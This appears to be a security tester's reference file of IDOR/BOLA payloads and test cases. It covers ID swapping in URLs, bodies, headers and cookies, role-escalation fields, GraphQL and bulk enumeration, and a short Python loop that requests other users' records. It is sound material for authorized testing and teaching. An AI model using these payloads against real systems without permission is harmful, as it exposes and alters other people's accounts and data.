# IDOR Payloads and Test Cases

This file contains practical, annotated payloads for discovering and exploiting IDOR/BOLA issues. Use with multiple user roles (unauthenticated, basic user, premium, admin) and test both horizontal and vertical access.

## URL/Path Parameter Manipulation
- Replace numeric IDs with nearby values
  - /api/users/1001 -> /api/users/1002
- Replace UUIDs with guessed/other UUIDs
  - /api/orders/9d3f2a2b-3d0e-4a63-8b6d-0d0b20e3d111
- Switch predictable slugs
  - /files/user_123/report.pdf -> /files/user_124/report.pdf

## Query Parameter Manipulation
- id=, userId=, account=, order=, invoice=
  - ?userId=124
  - ?account=ACC00126
- Boolean/flag flips
  - ?isAdmin=true

## Body Parameter Manipulation (JSON/Form)
```http
POST /api/profile/update
Content-Type: application/json

{
  "userId": 124,                 // change to another user
  "email": "victim@example.com"
}
```

```http
POST /api/orders/cancel
Content-Type: application/json

{
  "order_id": "ORD-12346"       // change to non-owned order
}
```

## Header-Based IDOR
- X-User-ID: 124
- X-Organization-ID: ORG-002
- X-Account: ACC-0002

Test: If server relies on headers for authz, change to target values.

## Cookie/Tokens
- user_id=124
- role=user -> role=admin (check if enforced server-side)

## Mass Assignment/Overposting
Include hidden/privileged fields:
```json
{
  "id": 123,
  "email": "me@example.com",
  "role": "admin",              // should be ignored server-side
  "organizationId": "ORG-002"   // attempt to switch tenant
}
```

## File/Object Endpoints
- /download?fileId=FILE-002
- /media/USER-124/avatar.jpg
- /invoices/INV-2024-00124.pdf

## Pagination/Filtering Leaks
- /api/users?limit=1000
- /api/users?filter=all
- /api/transactions?userId=124

## GraphQL
- Query other user IDs in node fields
```graphql
query getOrder($id: ID!) {
  order(id: $id) { id, user { id, email }, items { id, price } }
}
```
Try different $id values, or enumerate global IDs.

## Batch/Bulk Operations
- /api/users/bulk?ids=123,124,125
- /api/orders/export?userId=124

## Secondary Identifiers
- email=, phone=, username= as selectors in admin-like endpoints
- tenantId / organizationId in multi-tenant apps

## Race/TOCTOU
- Send authorized fetch + unauthorized update concurrently; check pre/post auth gaps.

## Common ID Patterns to Try
- Incrementing integers: 1..500
- Zero-padded: 0001..0500
- Date-based: 2024-0001
- Composite: ORD-<user>-<seq>
- ULIDs/UUIDv1 predictability windows

## Automation Snippets

Burp Intruder wordlist (IDs):
- 1..2000
- common-uuids.txt
- emails.txt/usernames.txt

Python requests loop:
```python
import requests
for i in range(1000,1050):
    r = requests.get(f"https://target/api/users/{i}", cookies={'session':'...'}, allow_redirects=False)
    if r.status_code in (200,403):
        print(i, r.status_code, len(r.content))
```

## Expected Signals of IDOR
- 200 with other user’s data
- 403 but response body reveals existence/metadata
- 302 to login only for some IDs
- Size/timing differences indicating object existence

## Evidence Collection
- Save paired requests: owned vs target object
- Capture user contexts (cookies, JWT claims)
- Note object identifiers and affected endpoints

## Safe Testing Notes
- Use test/staging accounts where possible
- Avoid destructive actions unless authorized
- Coordinate with stakeholders for high-impact endpoints
